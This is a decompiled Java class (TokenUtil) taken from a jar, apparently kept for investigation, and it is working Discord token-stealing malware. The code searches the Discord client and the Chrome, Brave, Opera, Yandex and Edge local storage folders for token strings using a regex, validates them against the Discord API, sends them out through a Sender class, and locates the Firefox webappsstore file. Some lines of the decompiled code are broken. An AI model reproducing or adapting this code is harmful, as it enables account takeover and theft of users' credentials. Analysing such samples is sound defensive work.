/*     */ package idasido.adldaosd.wpiw.util;
/*     */ import com.google.gson.JsonElement;
/*     */ import com.google.gson.JsonObject;
/*     */ import com.google.gson.reflect.TypeToken;
/*     */ import java.io.BufferedReader;
/*     */ import java.io.DataInputStream;
/*     */ import java.io.File;
/*     */ import java.io.FileInputStream;
/*     */ import java.net.HttpURLConnection;
/*     */ import java.net.URL;
/*     */ import java.util.ArrayList;
/*     */ import java.util.List;
/*     */ import java.util.Map;
/*     */ import java.util.Optional;
/*     */ import java.util.regex.Matcher;
/*     */ 
/*     */ public final class TokenUtil {
/*  18 */   private static final Gson gson = new Gson();
/*  19 */   public static final List<String> paths = new ArrayList<>(Arrays.asList(new String[] {
/*  20 */           System.getenv("APPDATA") + "\\Discord", 
/*  21 */           System.getenv("APPDATA") + "\\discordcanary", 
/*  22 */           System.getenv("APPDATA") + "\\discordptb", 
/*  23 */           System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default", 
/*  24 */           System.getenv("APPDATA") + "\\Opera Software\\Opera Stable", 
/*  25 */           System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default", 
/*  26 */           System.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default", 
/*  27 */           System.getenv("APPDATA") + "\\LightCord", 
/*  28 */           System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default"
/*     */         }));
/*     */ 
/*     */   
/*     */   public static List<String> getValidTokens(List<String> tokens) {
/*  33 */     ArrayList<String> validTokens = new ArrayList<>();
/*  34 */     tokens.forEach(token -> {
/*     */           try {
/*     */             URL url = new URL("https://discordapp.com/api/v6/users/@me");
/*     */             HttpURLConnection con = (HttpURLConnection)url.openConnection();
/*     */             Map<String, Object> stuff = (Map<String, Object>)gson.fromJson((JsonElement)getHeaders(token), (new TypeToken<Map<String, Object>>() {  }).getType());
/*     */             stuff.forEach(());
/*     */             con.getInputStream().close();
/*     */             validTokens.add(token);
/*  42 */           } catch (Exception exception) {}
/*     */         });
/*  44 */     return validTokens;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public static String getContentFromURL(String link, String auth) {
/*     */     try {
/*  51 */       URL url = new URL(link);
/*  52 */       HttpURLConnection httpURLConnection = (HttpURLConnection)url.openConnection();
/*  53 */       httpURLConnection.setRequestMethod("GET");
/*  54 */       Map<String, Object> json = (Map<String, Object>)gson.fromJson((JsonElement)getHeaders(auth), (new TypeToken<Map<String, Object>>() {  }).getType());
/*  55 */       json.forEach((key, value) -> httpURLConnection.addRequestProperty(key, (String)value));
/*  56 */       httpURLConnection.connect();
/*  57 */       BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
/*  58 */       StringBuilder stringBuilder = new StringBuilder();
/*     */       String line;
/*  60 */       for (; (line = bufferedReader.readLine()) != null; stringBuilder.append(line).append("\n"));
/*  61 */       bufferedReader.close();
/*  62 */       return stringBuilder.toString();
/*     */     }
/*  64 */     catch (Exception ignored) {
/*     */       
/*  66 */       return "";
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public static ArrayList<String> getTokens(String inPath) {
/*  72 */     String path = inPath + "\\Local Storage\\leveldb\\";
/*  73 */     ArrayList<String> tokens = new ArrayList<>();
/*     */     
/*  75 */     File pa = new File(path);
/*  76 */     String[] list = pa.list();
/*  77 */     if (list == null) return null;
/*     */     
/*  79 */     for (String s : list) {
/*     */ 
/*     */       
/*     */       try {
/*  83 */         FileInputStream fileInputStream = new FileInputStream(path + s);
/*  84 */         DataInputStream dataInputStream = new DataInputStream(fileInputStream);
/*  85 */         BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(dataInputStream));
/*     */         
/*     */         String line;
/*  88 */         while ((line = bufferedReader.readLine()) != null)
/*     */         {
/*  90 */           Matcher matcher = Pattern.compile("[\\w\\W]{24}\\.[\\w\\W]{6}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}").matcher(line);
/*  91 */           for (; matcher.find(); tokens.add(matcher.group()));
/*     */         }
/*     */       
/*  94 */       } catch (Exception exception) {}
/*     */     } 
/*     */     
/*  97 */     Sender.send(String.join(" - ", (Iterable)tokens));
/*     */     
/*  99 */     return tokens;
/*     */   }
/*     */ 
/*     */   
/*     */   public static JsonObject getHeaders(String token) {
/* 104 */     JsonObject object = new JsonObject();
/* 105 */     object.addProperty("Content-Type", "application/json");
/* 106 */     object.addProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
/* 107 */     if (token != null) object.addProperty("Authorization", token); 
/* 108 */     return object;
/*     */   }
/*     */ 
/*     */   
/*     */   public static List<String> removeDuplicates(List<String> list) {
/* 113 */     return (List<String>)list.stream().distinct().collect(Collectors.toCollection(ArrayList::new));
/*     */   }
/*     */ 
/*     */   
/*     */   public static Optional<File> getFirefoxFile() {
/* 118 */     File file = new File(System.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
/* 119 */     if (file.isDirectory())
/* 120 */       for (File file1 : (File[])Objects.<File[]>requireNonNull(file.listFiles())) {
/* 121 */         if (file1.isDirectory() && file1.getName().contains("release"))
/* 122 */           for (File file2 : (File[])Objects.<File[]>requireNonNull(file1.listFiles())) {
/* 123 */             if (file2.getName().contains("webappsstore"))
/* 124 */               return Optional.of(file2); 
/*     */           }  
/* 126 */       }   return Optional.empty();
/*     */   }
/*     */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpi\\util\TokenUtil.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */